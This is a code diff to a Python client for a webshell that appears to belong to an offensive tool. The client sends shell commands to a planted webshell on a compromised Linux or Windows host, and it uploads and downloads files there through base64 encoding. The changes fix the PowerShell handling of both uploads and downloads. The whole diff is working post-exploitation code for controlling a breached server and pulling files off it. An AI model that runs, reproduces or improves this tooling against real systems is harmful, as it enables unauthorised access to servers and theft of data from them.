@@ -96,8 +96,8 @@ try:
                    send_command("base64 -di " + remotefile + " > " + remotefiletmp + " ; mv " + remotefiletmp + " " +
                    remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "windows":
-                   command = " ; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) > "
-                   send_command("$base64 = cat -raw " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                   command = " ; [System.Convert]::FromBase64String($base64) | Set-Content -Encoding Byte "
+                   send_command("$base64 = cat -Encoding UTF8 " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
              else:
                 if "download" in command.split()[0]: 
                    remotefile = command.split()[1]
@@ -111,11 +111,10 @@ try:
                    print (colored("Downloading file "+ remotefile +" on "+ cwd + "/" + localfile +"..\n", "yellow"))
                    if system == "linux":
                       base64data = send_command("base64 " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
-                      download = base64.b64decode(base64data)
                    if system == "windows":
                        command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
                        base64data = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                       download = base64.b64decode(base64data).decode("utf-16le", errors="ignore").encode("utf8")
+                   download = base64.b64decode(base64data.encode("utf8"))
                    f = open(localfile, "wb") ; f.write(download) ; f.close()
                 else:
                    if "pwd" in command.split()[0]:
